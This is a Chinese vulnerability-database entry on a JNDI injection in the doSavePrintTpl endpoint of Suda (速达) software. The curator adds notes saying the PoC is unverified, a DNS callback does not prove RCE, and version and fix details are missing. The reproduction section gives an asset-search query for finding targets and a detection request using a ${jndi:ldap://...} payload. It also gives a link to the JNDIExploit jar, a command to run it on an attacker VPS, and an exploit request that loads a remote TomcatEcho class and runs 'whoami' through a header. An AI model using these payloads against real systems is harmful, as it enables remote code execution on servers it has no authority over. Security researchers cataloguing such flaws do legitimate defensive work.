---
source: "wy876 漏洞文库"
title: "速达软件 doSavePrintTpl report JNDI迹象"
product: "速达软件"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "JDK/日志组件/Tomcat条件未知"
prerequisites: "含JSESSIONID"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/naif5is5o46eq9h6"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E9%80%9F%E8%BE%BE%E8%BD%AF%E4%BB%B6/%E9%80%9F%E8%BE%BE%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF%EF%BC%88%E5%B9%BF%E5%B7%9E%EF%BC%89%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81doSavePrintTpl%E5%AD%98%E5%9C%A8JNID%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.body="
hunter: "web.body=\"速达软件技术（广州）有限公司\""
id: "vw-a6b1da5eb4d40cb17d6362f5"
entity_id: "ve-a6b1da5eb4d40cb17d6362f5"
schema_version: "1"
---

# 速达软件 doSavePrintTpl report JNDI迹象

## 条目说明

- 对象与具体问题：速达软件；doSavePrintTpl report JNDI迹象
- 版本、配置及部署条件：JDK/日志组件/Tomcat条件未知
- 认证与权限前提：含JSESSIONID
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 同接口228/231是accsetName SQLi，本篇report JNDI不同机制应分实体
- JNID错字、&&重复分隔、DNS不证明RCE、缺响应/版本/修复
- 保存模板可能改状态；Jar附件来源需固定核验

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
速达软件技术（广州）有限公司多款产品doSavePrintTpl存在JNID注入漏洞,攻击者可通过该漏洞获取服务器权限。

## 二、影响版本
+ 速达软件技术（广州）有限公司多款产品

## 三、资产测绘
+ hunter`web.body="速达软件技术（广州）有限公司"`
+ 特征


## 四、漏洞复现
1. 获取dnslog

```plain
dffd7g.dnslog.cn
```


2. 检测是否存在漏洞

```http
GET /common/print/print!doSavePrintTpl.action?report=${jndi:ldap://dffd7g.dnslog.cn}&&rptid=1&employId=1&accsetName=1&modId=1 HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=95B
Connection: close
```


漏洞利用

[JNDIExploit-1.4-SNAPSHOT.jar](https://www.yuque.com/attachments/yuque/0/2024/jar/1622799/1709222146317-10daccfd-9800-4fa7-899a-ce904aab6f1d.jar)

将`JNDIExploit-1.4-SNAPSHOT.jar`上传到`vps`

```plain
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i vpsip
```


```http
GET /common/print/print!doSavePrintTpl.action?report=${jndi:ldap://vpsip:1389/Basic/TomcatEcho}&&rptid=1&employId=1&accsetName=1&modId=1 HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
cmd: whoami
Cookie: JSESSIONID=95B
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/naif5is5o46eq9h6>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
